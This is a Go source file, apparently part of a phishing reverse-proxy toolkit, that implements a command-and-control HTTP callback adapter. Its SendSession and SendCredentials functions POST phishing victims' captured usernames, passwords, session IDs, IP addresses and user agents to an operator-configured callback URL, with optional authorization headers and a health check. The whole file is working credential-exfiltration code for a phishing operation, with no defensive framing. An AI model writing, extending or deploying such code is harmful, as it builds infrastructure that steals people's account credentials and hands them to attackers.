package c2

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// HTTPCallbackAdapter generic HTTP/S callback for custom C2
type HTTPCallbackAdapter struct {
	config     *HTTPCallbackConfig
	httpClient *http.Client
}

// HTTPCallbackConfig configuration
type HTTPCallbackConfig struct {
	Enabled       bool     `yaml:"enabled" mapstructure:"enabled"`
	CallbackURL   string   `yaml:"callback_url" mapstructure:"callback_url"`
	Headers       []string `yaml:"headers" mapstructure:"headers"`             // "Authorization: Bearer xxx"
	PollInterval  int      `yaml:"poll_interval" mapstructure:"poll_interval"` // seconds
}

// NewHTTPCallbackAdapter creates HTTP callback adapter
func NewHTTPCallbackAdapter(cfg *HTTPCallbackConfig) *HTTPCallbackAdapter {
	return &HTTPCallbackAdapter{
		config: cfg,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// Name returns adapter name
func (a *HTTPCallbackAdapter) Name() string { return "http_callback" }

// IsAvailable checks callback URL
func (a *HTTPCallbackAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.CallbackURL == "" {
		return false
	}
	req, _ := http.NewRequestWithContext(ctx, "HEAD", a.config.CallbackURL, nil)
	a.setHeaders(req)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode < 500
}

func (a *HTTPCallbackAdapter) setHeaders(req *http.Request) {
	for _, h := range a.config.Headers {
		// Parse "Key: Value"
		for i := 0; i < len(h); i++ {
			if h[i] == ':' {
				req.Header.Set(h[:i], h[i+2:])
				break
			}
		}
	}
}

// SendSession POSTs session to callback URL
func (a *HTTPCallbackAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}
	payload := map[string]interface{}{
		"event":      "session",
		"session_id": data.SessionID,
		"victim_ip":  data.VictimIP,
		"phishlet":   data.PhishletID,
		"user_agent": data.UserAgent,
	}
	if data.Credentials != nil {
		payload["username"] = data.Credentials.Username
		payload["password"] = data.Credentials.Password
	}
	body, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.CallbackURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setHeaders(req)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("callback returned %d", resp.StatusCode)
	}
	return nil
}

// SendCredentials POSTs credentials to callback
func (a *HTTPCallbackAdapter) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}
	payload := map[string]interface{}{
		"event":    "credentials",
		"username": creds.Username,
		"password": creds.Password,
	}
	for k, v := range metadata {
		payload[k] = v
	}
	body, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.CallbackURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setHeaders(req)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// HealthCheck verifies callback
func (a *HTTPCallbackAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("callback URL not reachable")
	}
	return nil
}
